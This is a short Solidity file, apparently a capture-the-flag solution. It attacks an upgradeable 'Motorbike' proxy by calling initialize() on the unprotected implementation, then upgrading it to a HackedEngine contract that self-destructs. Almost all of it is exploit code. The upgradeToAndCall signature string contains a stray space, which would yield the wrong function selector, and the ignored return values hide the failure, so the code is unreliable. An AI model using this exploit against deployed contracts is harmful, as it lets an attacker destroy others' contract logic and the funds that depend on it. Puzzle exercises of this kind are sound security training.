// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

contract HMotorbike {
    address public implementation;

    constructor(address _implementation) public {
        implementation = _implementation;
    }

    function _hackInitialise() private {
        (bool success, ) = implementation.call(
            abi.encodeWithSignature("initialize()")
        );
    }

    function _blowUpEngine() private {
        HackedEngine hackedEngine = new HackedEngine();
        (bool success, ) = implementation.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address, bytes)",
                address(hackedEngine),
                abi.encodeWithSignature("initialize()")
            )
        );
    }

    function hack() public {
        _hackInitialise();
        _blowUpEngine();
    }
}

contract HackedEngine {
    function initialize() external {
        selfdestruct(msg.sender);
    }
}
